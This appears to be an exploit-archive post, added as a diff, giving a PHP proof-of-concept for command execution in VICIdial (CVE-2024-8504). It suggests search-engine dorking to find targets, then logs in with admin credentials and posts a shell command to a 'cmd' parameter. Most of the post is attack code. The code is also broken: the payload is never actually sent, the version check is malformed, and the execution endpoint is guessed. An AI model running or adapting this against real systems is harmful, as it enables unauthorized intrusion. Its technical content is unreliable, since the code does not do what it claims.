@@ -1,0 +1,112 @@
+=============================================================================================================================================
+| # Title     : VICIdial v 2.14-917 PHP Execute system commands                                                                             |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 10 Fr(Pro) / browser : Mozilla firefox 136.0.0 (64 bits)                                                            |
+| # Vendor    : https://www.vicidial.org/                                                                                                   |
+=============================================================================================================================================
+
+POC :
+
+[+] Dorking İn Google Or Other Search Enggine.
+
+[+] Code Description: Execute system commands indirectly to bypass security restrictions.
+
+    (Related : https://packetstorm.news/files/id/181461/ Related CVE numbers: CVE-2024-8504) .
+
+[+] Set Target : line 73
+
+[+] Usage : php poc.php 
+
+[+] PayLoad :
+
+
+<?php
+
+class VICIdialExploit {
+    private $target;
+    private $username;
+    private $password;
+    
+    public function __construct($target, $username, $password) {
+        $this->target = $target;
+        $this->username = $username;
+        $this->password = $password;
+    }
+    
+    public function checkVulnerability() {
+        $url = "$this->target/agc/vicidial.php";
+        $response = $this->sendRequest($url);
+        
+        if (!$response || strpos($response, 'VERSION:') === false) {
+            return "Unknown";
+        }
+        
+        preg_match('/VERSION:\s*(\d+\.\d+)-(\d+)/', $response, $matches);
+        $version = isset($matches[0]) ? $matches[0] : '';
+        
+        if (!$version) {
+            return "Unknown";
+        }
+        
+        return version_compare($version, '2.14-917a', '<=') ? "Vulnerable" : "Safe";
+    }
+    
+    public function exploit() {
+        $auth = base64_encode("$this->username:$this->password");
+        
+        $headers = [
+            "Authorization: Basic $auth"
+        ];
+        
+        $url = "$this->target/vicidial/admin.php?ADD=3&user=$this->username";
+        $response = $this->sendRequest($url, $headers);
+        
+        if (!$response) {
+            die("Failed to authenticate");
+        }
+        
+        echo "Authenticated successfully.\n";
+        
+        // تنفيذ الحمولة المغايرة هنا
+        $payload = "echo 'Hacked';"; // يجب تعديلها لتناسب البيئة
+        $this->executePayload($payload);
+    }
+    
+    private function sendRequest($url, $headers = []) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+        $response = curl_exec($ch);
+        curl_close($ch);
+        return $response;
+    }
+    
+    private function executePayload($payload) {
+        $url = "$this->target/execute.php"; // يجب تعديل هذا حسب البيئة
+        $headers = ["Content-Type: application/x-www-form-urlencoded"];
+        $data = "cmd=" . urlencode($payload);
+        
+        $this->sendRequest($url, $headers, $data);
+        echo "Payload executed.\n";
+    }
+}
+
+$target = "http://example.com"; // استبدل بعنوان الهدف
+$username = "admin";
+$password = "admin123";
+
+$exploit = new VICIdialExploit($target, $username, $password);
+$status = $exploit->checkVulnerability();
+
+if ($status === "Vulnerable") {
+    echo "Target is vulnerable.\n";
+    $exploit->exploit();
+} else {
+    echo "Target is not vulnerable.\n";
+}
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
